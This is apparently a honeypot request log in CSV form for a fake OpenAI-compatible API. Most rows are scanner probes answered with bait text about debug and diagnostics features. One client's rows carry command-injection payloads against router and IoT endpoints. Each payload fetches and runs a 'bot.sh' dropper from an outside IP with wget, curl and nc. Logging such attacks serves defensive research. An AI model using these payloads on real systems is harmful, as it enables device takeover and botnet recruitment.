request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
fceed29f-3fa8-4836-bd12-d5fdd971ded6,2026-05-11T02:07:12.916271+00:00,anon_0f292162,GET,/portal/redlion,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
61acd80c-0251-432a-86b6-0ed95894c338,2026-05-11T02:07:18.758520+00:00,anon_81708461,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
3763cfb8-722a-4928-9d5b-329f7ad61d9c,2026-05-11T02:12:28.428460+00:00,anon_61ed4dec,GET,/cgi-bin/luci/;stok=/locale,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
26ea20cb-2b0e-4af0-9d83-995ea0eb4804,2026-05-11T02:12:30.737129+00:00,anon_61ed4dec,GET,/cgi-bin/supervisor/Factory.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b6e866a0-2d1d-46f6-9420-9fe0fb11e735,2026-05-11T02:12:33.081378+00:00,anon_61ed4dec,POST,/ctrlt/DeviceUpgrade_1,[honeypot-host],,,485,316,1,,"<?xml version=""1.0"" ?><s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/"" s:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""><s:Body><u:Upgrade xmlns:u=""urn:schemas-upnp-org:service:WANPPPConnection:1""><NewStatusURL>$(cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &)</NewStatusURL><NewDownloadURL>$(echo HUAWEI)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>","<?xml version=""1.0"" ?><s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/"" s:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""><s:Body><u:Upgrade xmlns:u=""urn:schemas-upnp-org:service:WANPPPConnection:1""><NewStatusURL>$(cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &)</NewStatusURL><NewDownloadURL>$(echo HUAWEI)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3426f87f-c1d2-41b6-8102-ed76d09d962a,2026-05-11T02:12:35.390225+00:00,anon_61ed4dec,POST,/picsdesc.xml,[honeypot-host],,,770,316,1,,"<?xml version=""1.0""?><SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""><SOAP-ENV:Body><m:AddPortMapping xmlns:m=""urn:schemas-upnp-org:service:WANIPConnection:1""><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></m:AddPortMapping></SOAP-ENV:Body></SOAP-ENV:Envelope>","<?xml version=""1.0""?><SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""><SOAP-ENV:Body><m:AddPortMapping xmlns:m=""urn:schemas-upnp-org:service:WANIPConnection:1""><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></m:AddPortMapping></SOAP-ENV:Body></SOAP-ENV:Envelope>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7c51eeca-e34b-4b5c-b804-caa1d27b1b88,2026-05-11T02:12:37.833829+00:00,anon_61ed4dec,POST,/goform/formSysCmd,[honeypot-host],,,250,316,1,,sysCmd=cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F130.78.217.194%3A8888%2Fbot.sh%20-O-%20%7C%20sh%3B%20curl%20http%3A%2F%2F130.78.217.194%3A8888%2Fbot.sh%20%7C%20sh%3B%20nc%20130.78.217.194%209001%20%3E%20e%3B%20chmod%20755%20e%3B%20.%2Fe%20%26&apply=Apply,sysCmd=cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F130.78.217.194%3A8888%2Fbot.sh%20-O-%20%7C%20sh%3B%20curl%20http%3A%2F%2F130.78.217.194%3A8888%2Fbot.sh%20%7C%20sh%3B%20nc%20130.78.217.194%209001%20%3E%20e%3B%20chmod%20755%20e%3B%20.%2Fe%20%26&apply=Apply,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7b36e125-0f24-4836-a90b-a59ffd208a31,2026-05-11T02:12:40.230031+00:00,anon_61ed4dec,GET,/geoserver/ows,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
90c801c3-0234-49b6-a0e9-48ca792b2b02,2026-05-11T02:12:42.646401+00:00,anon_61ed4dec,POST,/goform/set_LimitClient_cfg,[honeypot-host],,,173,316,1,,time1=00:00-00:00&mac=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;,time1=00:00-00:00&mac=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
880656b9-388f-4ce8-9442-4a2401909235,2026-05-11T02:12:47.107848+00:00,anon_61ed4dec,POST,/goform/formAdvFirewall,[honeypot-host],,,159,316,1,,curTime=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;,curTime=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5b5211ea-9416-42f0-8b86-bad6962ee264,2026-05-11T02:12:49.141447+00:00,anon_61ed4dec,POST,/GponForm/diag_Form,[honeypot-host],,,216,316,1,,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;&ipv=0,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;&ipv=0,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e4ebb5f3-50f5-47d8-8959-00d31185e7de,2026-05-11T02:12:51.402243+00:00,anon_61ed4dec,GET,/config/getuser,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c258aabe-f143-419a-9dd9-fe4899fab3c0,2026-05-11T02:12:53.669708+00:00,anon_61ed4dec,POST,/ztp/cgi-bin/handler,[honeypot-host],,,256,316,1,,"{""command"":""setWanPortSt"",""proto"":""dhcp"",""port"":""4"",""vlan_tagged"":""1"",""vlanid"":""5"",""mtu"":""; cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;"",""data"":""hi""}","{""command"":""setWanPortSt"",""proto"":""dhcp"",""port"":""4"",""vlan_tagged"":""1"",""vlanid"":""5"",""mtu"":""; cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;"",""data"":""hi""}",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
139ee1f5-7773-4e69-b3df-fd1a36cccc56,2026-05-11T02:12:56.006626+00:00,anon_61ed4dec,GET,/remote_agent.php,[honeypot-host],,anon_12ca17b4,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2474c04c-e24b-4dc4-96e8-41a7d46b6110,2026-05-11T02:12:58.353316+00:00,anon_61ed4dec,GET,/userRpm/popupSiteSurveyRpm.htm,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
1b731398-2d2c-4b49-bf69-be200f66dd72,2026-05-11T02:13:00.739836+00:00,anon_61ed4dec,POST,/DateSetting.cgi,[honeypot-host],,,163,316,1,,szSrvIpAddr=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;,szSrvIpAddr=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d58dacd7-62e2-477b-a435-d8d26671f375,2026-05-11T02:13:03.111261+00:00,anon_61ed4dec,POST,/cgi-bin/param.cgi,[honeypot-host],,,160,316,1,,ntp_addr=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;,ntp_addr=;cd /tmp; wget http://130.78.217.194:8888/bot.sh -O- | sh; curl http://130.78.217.194:8888/bot.sh | sh; nc anon_61ed4dec 9001 > e; chmod 755 e; ./e &;,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
04867131-845c-47dc-aab5-22de281cc5d1,2026-05-11T02:13:05.466731+00:00,anon_61ed4dec,GET,/setup.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
63ff9cdf-8786-4fc2-a39f-882c720c8b90,2026-05-11T02:13:07.851659+00:00,anon_61ed4dec,GET,/shell,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d16cc7f0-c344-44b2-be47-281784841eca,2026-05-11T02:13:10.199955+00:00,anon_61ed4dec,GET,/board.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8009f132-b105-48db-8f74-e42316fc606d,2026-05-11T02:20:44.948514+00:00,anon_5c8e199f,GET,/,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
a2feef8a-0e94-480b-bb61-1c12a691a1a1,2026-05-11T02:23:30.574498+00:00,anon_81708461,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
a0052e38-a281-4dee-ab5c-bbda4d225eb6,2026-05-11T02:28:27.132349+00:00,anon_0f0b3591,GET,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
f1756191-beee-484c-89be-82fa2e56cc87,2026-05-11T02:30:51.228991+00:00,anon_c23e2f9e,GET,/,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
a598e227-831d-461c-a3aa-b1acebc7104c,2026-05-11T02:37:56.796371+00:00,anon_e05eb1ce,GET,/,[honeypot-host],Mozilla/5.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
a58c2c16-a31f-4760-a66a-ee740ca56f01,2026-05-11T02:38:10.596848+00:00,anon_81708461,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
c3c3103f-6d9d-4180-b3ad-bcef602da02f,2026-05-11T02:56:38.931916+00:00,anon_b430ad70,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
b5c20262-8264-49d3-b6cd-a453b9fe5e90,2026-05-11T03:03:35.112852+00:00,anon_81708461,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",1,
6d28cd23-af62-46f9-a7c8-7901e9a66427,2026-05-11T03:20:10.582929+00:00,anon_81708461,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
e3060cd1-d115-40f2-a9c5-19ff8cb49da5,2026-05-11T03:28:24.387108+00:00,anon_81708461,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
d0711125-fcf8-4448-b166-a49e28a40e35,2026-05-11T03:52:00.081999+00:00,anon_81a95d99,GET,/.env,[honeypot-host],"Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f2e13cec-bef3-4167-a985-0031a36393fc,2026-05-11T04:00:22.850294+00:00,anon_81df3aa3,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
b2ead0c6-6bea-44e3-9267-67f50cd24b54,2026-05-11T04:00:40.101275+00:00,anon_2cacc2d6,GET,/,[honeypot-host],Mozilla/5.0 (compatible),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
070f052b-47ef-4a82-8ebc-9c325ee9268b,2026-05-11T04:09:16.255979+00:00,anon_551a0f73,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
7a402ed6-cad3-43c4-ad35-c007d50e7eee,2026-05-11T04:25:37.388117+00:00,anon_9601cbad,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
